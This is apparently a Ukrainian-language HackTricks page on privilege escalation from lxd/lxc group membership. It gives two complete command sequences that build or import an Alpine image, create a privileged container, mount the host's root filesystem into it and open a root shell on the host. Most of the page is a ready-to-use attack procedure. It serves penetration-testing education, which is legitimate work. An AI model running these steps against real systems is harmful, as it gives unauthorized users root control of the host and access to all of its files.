# lxd/lxc Група - Підвищення привілеїв

{{#include ../../../banners/hacktricks-training.md}}

Якщо ви належите до _**lxd**_ **або** _**lxc**_ **групи**, ви можете стати root

## Експлуатація без інтернету

### Метод 1

Ви можете завантажити образ alpine для використання з lxd з надійного репозиторію. 
Canonical публікує щоденні збірки на своєму сайті: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/)
Просто візьміть обидва **lxd.tar.xz** і **rootfs.squashfs** з найновішої збірки. (Назва каталогу - це дата).

Альтернативно, ви можете встановити на своєму комп'ютері цей дистрибутивний будівельник: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (дотримуйтесь інструкцій на github):
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
Завантажте файли **incus.tar.xz** (**lxd.tar.xz**, якщо ви завантажили з репозиторію Canonical) та **rootfs.squashfs**, додайте зображення до репозиторію та створіть контейнер:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Якщо ви знайдете цю помилку _**Помилка: Не знайдено пулу зберігання. Будь ласка, створіть новий пул зберігання**_\
> Запустіть **`lxd init`** і налаштуйте всі параметри за замовчуванням. Потім **повторіть** попередній блок команд

Нарешті, ви можете виконати контейнер і отримати root:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Метод 2

Створіть образ Alpine і запустіть його, використовуючи прапор `security.privileged=true`, змушуючи контейнер взаємодіяти як root з файловою системою хоста.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
